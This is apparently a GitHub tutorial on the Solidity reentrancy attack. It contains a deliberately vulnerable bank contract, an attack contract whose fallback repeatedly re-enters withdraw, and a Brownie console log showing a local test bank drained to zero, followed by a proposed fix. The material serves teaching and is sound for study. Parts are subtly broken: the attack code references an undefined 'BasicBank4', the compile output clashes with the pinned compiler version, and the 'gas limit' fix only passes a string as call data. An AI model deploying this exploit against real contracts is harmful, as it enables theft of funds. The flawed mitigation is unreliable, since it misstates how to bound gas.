# Reentracy Attack
## 🗺️ Overview 
The Reentrancy attack is one of the most destructive attacks in the Solidity smart contract. A reentrancy attack occurs when a function makes an external call to another untrusted contract. Then the untrusted contract makes a recursive call back to the original function in an attempt to drain funds.

When the contract fails to update its state before sending funds, the attacker can continuously call the withdraw function to drain the contract’s funds. A famous real-world Reentrancy attack is the DAO attack which caused a loss of 60 million US dollars.

## 💻 How Does Reentracy Attack Work?
In simple terms, a reentrancy attack occurs between two smart contracts, where an attacking smart contract exploits the code in a vulnerable contract to drain it of its funds. The exploit works by having the attacking smart contract repeatedly call the withdraw function before the vulnerable smart contract has had time to update the balance.

This is only possible because of the order in which the smart contract is set up to handle transactions, with the vulnerable smart contract first checking the balance, then sending the funds, and then finally updating its balance. The time between sending the funds and updating the balance creates a window in which the attacking smart contract can make another call to withdraw its funds, and so the cycle continues until all the funds are drained.

<img src='https://github.com/wasny0ps/Reentracy/blob/main/img/reentracy.png'>

## 🎬 Reentrancy Attack Scenario
1> The vulnerable smart contract has 10 eth.

2> An attacker stores 1 eth using the deposit function.

3> An attacker calls the withdraw function and points to a malicious contract as a recipient.

4> Now withdraw function will verify if it can be executed:

Does the attacker have 1 eth on their balance? Yes – because of their deposit.

Transfer 1 eth to a malicious contract. (Note: attacker balance has NOT been updated yet)

Fallback function on received eth calls withdraw function again.

4>Now withdraw function will verify if it can be executed:

Does the attacker have 1 eth on their balance? Yes – because the balance has not been updated.

Transfer 1 eth to a malicious contract and again until the attacker will drain all the funds stored on the contract.
## 📄 Example Of Vulnereable Contract
This contract is designed to provide basic web3 banking services and includes vulnerabilities that are frequently encountered in other smart contracts.
```
//SPDX-License-Identifier: MIT
pragma solidity 0.7.0;

contract BasicBank {

    mapping (address => uint) private userFunds;
    address private commissionCollector;
    uint private collectedComission = 0;

    constructor() {
        commissionCollector = msg.sender;
    }
    
    modifier onlyCommissionCollector {
        require(msg.sender == commissionCollector);
        _;
    }

    function deposit() public payable {
        require(msg.value >= 1 ether);
        userFunds[msg.sender] += msg.value;
    }

    function withdraw(uint _amount) external payable {
        require(getBalance(msg.sender) >= _amount);
        msg.sender.call{value: _amount}("");
        userFunds[msg.sender] -= _amount;
        userFunds[commissionCollector] += _amount/100;
    }   

    function getBalance(address _user) public view returns(uint) {
        return userFunds[_user];
    }

    function getCommissionCollector() public view returns(address) {
        return commissionCollector;
    }

    function transfer(address _userToSend, uint _amount) external{
        userFunds[_userToSend] += _amount;
        userFunds[msg.sender] -= _amount;
    }

    function setCommissionCollector(address _newCommissionCollector) external onlyCommissionCollector{
        commissionCollector = _newCommissionCollector;
    }

    function collectCommission() external {
        userFunds[msg.sender] += collectedComission;
        collectedComission = 0;
    }
}
```
## 🔎 Analyze
Although there are many vulnerabilities in this smart contract, we should focus on the ```withdraw()``` function to find the reason for the reentracy vulnerability. Function start with a control about user balance who want to make a draft from bank. Then, there is an order of transactions which are exploitable with reentrancy attack. The reason why this code snippet is vulnerable is that the user withdraws money without updating his/her balance.As a result, the attacker can constantly call withdrawals to his own account without the balance update process.
## 🕷 A Closer Look at the Attack Contract

Let's start with importing BasicBank.sol file which is in the same directory. After that, I create new BasicBank object named target and use ```constructor()``` function for which learn target contract address. Arrive second step, at least one ether must be deposited to make a transaction on the target contract.So, I had called deposit() function from target contract and withdrew it. The only thing for coffe break, we must add ```fallback()``` function. Shortly, fallback function only works when external payment comes into contract. When external payment comes into attack contract from target, call withdraw function from target again and again until target balance's less than 1 ether. Thus, our attack contract will have withdrew all money in bank.
```
//SPDX-License-Identifier: MIT
pragma solidity 0.7.0;

import './BasicBank.sol';

contract Attack{

    BasicBank public target;
    
    constructor(address payable _target){
        target = BasicBank4(_target);
    }
    
    function attack() external payable{
        require(msg.value >= 1e18, "At least 1 ether");
        target.deposit{value: 1e18}();
        target.withdraw(1e18);
    }
     
    fallback()external payable{
        if(address(target).balance >= 1e18){
            target.withdraw(1e18);
        }
    }
}
``` 
## 🕸 Attack
I use **brownie framework** in *vísual studio code terminal* while attacking that's why I create new project with brownie and add files.
```
brownie init
```
```
cd contracts
```
Compile contracts.
```
brownie compile
```
```
INFO: Could not find files for the given pattern(s).
Brownie v1.19.1 - Python development framework for Ethereum

Downloading from https://solc-bin.ethereum.org/windows-amd64/solc-windows-amd64-v0.8.17+commit.8df45f5f.exe
100%|███████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████| 8.95M/8.95M [00:10<00:00, 814kiB/s]
solc 0.8.17 successfully installed at: C:\Users\pc1\.solcx\solc-v0.8.17\solc.exe
Compiling contracts...
  Solc version: 0.8.17
  Optimizer: Enabled  Runs: 200
  EVM Version: Istanbul
Generating build data...
 - BasicBank
 - Attack
```
Deploy *BasicBank* contract with **brownie console**.
```
brownie console
```
```
>>> bank = accounts[0].deploy(BasicBank)
Transaction sent: 0x3dff3c2bb305d4b3b511181572a2a898db562ea6bb90bbc46859b5bff3d4fed0
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
  BasicBank.constructor confirmed   Block: 1   Gas used: 253317 (2.11%)
  BasicBank deployed at: 0x3194cBDC3dbcd3E11a07892e7bA5c3394048Cc87
```

Afterwards, I deposit money into my user account, just as customers of this bank do.
```
>>> bank.deposit({'from': accounts[0], 'value': 10e18})
Transaction sent: 0xca7331d18bb57baca3b6ade1ce81818fc3b172c5c075998482367c82a45c9aa6
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 1
  BasicBank.deposit confirmed   Block: 2   Gas used: 42116 (0.35%)

<Transaction '0xca7331d18bb57baca3b6ade1ce81818fc3b172c5c075998482367c82a45c9aa6'>

```
```
>>> bank.getBalance(accounts[0])
10000000000000000000
```
The money has been entered into the bank. Why don't we attack?
Firstly, deploy *Attack* contract and enter target contract address.
```
>>> reentracy = accounts[1].deploy(Attack, '0x3194cBDC3dbcd3E11a07892e7bA5c3394048Cc87')
Transaction sent: 0xd57f8472a3a7668108ae62f7d52a82180fb7a0ea664090bb2b42d06bf7a6a8c0
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 0
  Attack.constructor confirmed   Block: 3   Gas used: 204880 (1.71%)
  Attack deployed at: 0xe7CB1c67752cBb975a56815Af242ce2Ce63d3113
```
And reentracy! We succesfully hacked this smart contract.
```
>>> reentracy.attack({'from': accounts[1], 'value':1e18})
Transaction sent: 0xa139f01266d62f4d82ccd46fb5dc143582c23052f9c9e40026e2091ae2257923
  Gas price: 0.0 gwei   Gas limit: 12000000   Nonce: 1
  Attack.attack confirmed   Block: 4   Gas used: 239974 (2.00%)

<Transaction '0xa139f01266d62f4d82ccd46fb5dc143582c23052f9c9e40026e2091ae2257923'>
>>> reentracy.balance()
11000000000000000000
```
```
>>> bank.balance()
0
```
## 🤝 How To Prevent Reentracy Attack?

As I mentioned in the analyze part, the order of transactions in the ```withdraw()``` function is constructed with a wrong point of view. Therefore, if the transaction order is made like this way, the reentracy vulnerability will die out. What is more, when you use ```call()```, you should limit the gas fee.

```
function withdraw(uint _amount) external payable {
        require(getBalance(msg.sender) >= _amount);
        userFunds[msg.sender] -= _amount;
        msg.sender.call{value: _amount}("8600");
        userFunds[commissionCollector] += _amount/100;
}
```






**_by wasny0ps_**
